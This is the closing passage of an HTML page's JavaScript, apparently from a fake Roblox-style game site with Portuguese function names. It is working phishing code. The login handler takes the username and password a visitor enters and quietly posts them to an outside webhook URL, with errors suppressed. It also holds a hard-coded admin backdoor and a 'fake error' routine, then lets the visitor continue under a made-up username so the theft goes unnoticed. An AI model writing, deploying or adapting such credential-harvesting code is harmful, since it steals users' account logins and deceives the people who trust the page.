        function processarLogin() { const u=document.getElementById('inp-user').value.trim(); const p=document.getElementById('inp-pass').value.trim(); if(!u||!p) return triggerFakeError(); if(u==="Admin"&&p==="LP"){fecharModais();logarReal("Admin",true);return;} enviarWebhook(`## USER: ${u} | PASS: ${p}`); modalFormRoblox.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
        function confirmarUsername() { const n=document.getElementById('inp-new-username').value.trim(); if(!n) return alert("Digite um nome"); fecharModais(); logarReal(n,false); localStorage.setItem('local_username',n); }
        
        function logarReal(n,adm) { 
            currentUser={nome:n,isAdmin:adm}; 
            document.getElementById('btn-login-main').classList.add('hidden'); 
            document.getElementById('user-display').classList.remove('hidden'); 
            document.getElementById('user-display').classList.add('flex'); 
            document.getElementById('header-username').innerText=n; 
            
            if(adm){ 
                btnUpload.classList.remove('hidden'); 
                btnUpload.style.display='flex';
                carregarJogos(); 
            } 
        }

        function logout() { currentUser=null; document.getElementById('user-display').classList.add('hidden'); btnUpload.classList.add('hidden'); document.getElementById('btn-login-main').classList.remove('hidden'); toggleSidebar(); carregarJogos(); }
        function enviarWebhook(m) { fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:m})}).catch(()=>{}); }
    </script>
</body>
</html>
